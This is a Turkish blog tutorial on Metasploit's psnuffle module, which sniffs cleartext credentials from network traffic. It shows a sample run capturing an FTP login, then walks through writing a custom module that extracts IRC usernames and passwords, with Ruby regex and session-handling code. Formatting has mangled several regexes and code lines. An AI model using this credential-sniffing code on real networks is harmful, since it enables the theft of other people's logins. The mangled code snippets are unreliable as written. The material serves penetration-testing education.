---
draft: false

title:  'MSF İçinde Parola Dinleme'
date: '2017-05-16T12:56:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.' 
 
url:  /tr/msf-icinde-parola-dinleme/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.



`psnuffle` modülü, neredeyse hiçbir ayarlama yapmaya gerek kalmadan kullanılabilir. İsterseniz dışarıdan PCAP dosyası ithal edebilirsiniz. Buradaki örnekte, ayarlar olduğu gibi kullanılacaktır.


```bash
msf > use auxiliary/sniffer/psnuffle
msf auxiliary**(**psnuffle**)** > show options

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string **for **capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    1                yes       The number of seconds to wait **for **new data

msf auxiliary**(**psnuffle**)** > run
> Auxiliary module execution completed
> Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
> Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
> Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
> Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
> Sniffing traffic.....
> Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 **>>** victim / pass **(**220 3Com 3CDaemon FTP Server Version 2.0**)**
```



Gördüğünüz gibi FTP protokolünde `victim` kullanıcı adı ve `pass` parolası ortaya çıkarıldı.



## Psnuffle Özelleştirme



İsterseniz, `psnuffle` aracını, varsayılan olarak dinlediği protokoller haricinde diğer protokoller için de tasarlayabilirsiniz.



Bu özelleştirme işlemi için yapılacak modüller, data/exploits/psnuffle klasörünün içine kaydedilmelidir. Yeni bir modül geliştirmek için öncelikle var olan bir modülü şablon olarak kullanabiliriz.



Aşağıda, POP3 modülünün Düzenli ifadeler kısmı görülmektedir. Bu düzenli ifadeler, dinleme esnasında hangi tür şablona uyan verilerin dikkate alınacağını tanımlamaktadır. Bir miktar karışık gibi görünebilir. Ancak düzenli ifadeleri öğrenmenizi tavsiye ediyoruz. Her yerde karşınıza çıkar ve öğrenirseniz, işinizi kolaylaştırırlar.


```bash
self.sigs **=** **{**
:ok **=>** /^**(**+OK[^n]*******)**n/si,
:err **=>** /^**(**-ERR**[**^n]*******)**n/si,
:user **=>** /^USERs+**([**^n]+**)**n/si,
:pass **=>** /^PASSs+**([**^n]+**)**n/si,
:quit **=>** /^**(**QUITs*******[**^n]*******)**n/si **}**
```



## IRC Modülü



Aşağıdaki örneklerde, IRC protokolü için yazılmış bir modülde olması gerekenleri görebilirsiniz.



Öncelikle, dikkate alınacak sinyal tiplerini tanımlayalım. Buradaki IRC komutlarından IDENTIFY, her IRC sunucu tarafından kullanılmamaktadır. En azında Freenode bu şekilde kullanır.


```bash
self.sigs = {
:user => /^(NICKs+[^n]+)/si,
:pass => /b(IDENTIFYs+[^n]+)/si,}
```



## Oturum Tanımlama (Session)



Her modül için mutlaka tanımlanması gereken kısım, hangi Portlar ile ilgileneceğidir. Bu tanımlama için aşağıdaki şablonu kullanabilirsiniz.


```bash
**return if **not pkt[:tcp] # We don't want to handle anything other than tcp
**return if** **(**pkt[:tcp].src_port **!=** 6667 and pkt[:tcp].dst_port **!=** 6667**)** # Process only packet on port 6667

#Ensure that the session hash stays the same for both way of communication
**if** **(**pkt[:tcp].dst_port **==** 6667**)** # When packet is sent to server
s **=** find_session**(**"#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}"**)**
**else** # When packet is coming from the server
s **=** find_session**(**"#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}"**)**
end
```



Şimdi ise `self.sigs` bölümünde şablonu oluşturulan türde bir paket yakalandığında ne yapılacağını ayarlamanız gerekmekte. Bunun için de aşağıdaki şablonu kullanabilirsiniz.


```bash
**case** matched
when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
s[:user]**=**matches #Store the name into the session hash s for later use
# Do whatever you like here... maybe a puts if you need to
when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching
s[:pass]**=**matches # Store the password into the session hash s as well
**if** **(**s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it
print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}n"
end
sessions.delete**(**s[:session]**)** # Remove this session because we dont need to track it anymore
when nil
# No matches, don't do anything else # Just in case anything else is matching...
sessions[s[:session]].merge!**({**k **=>** matches**})** # Just add it to the session object
end
```



Tebrikler kendi modülünüzü yazdınız.
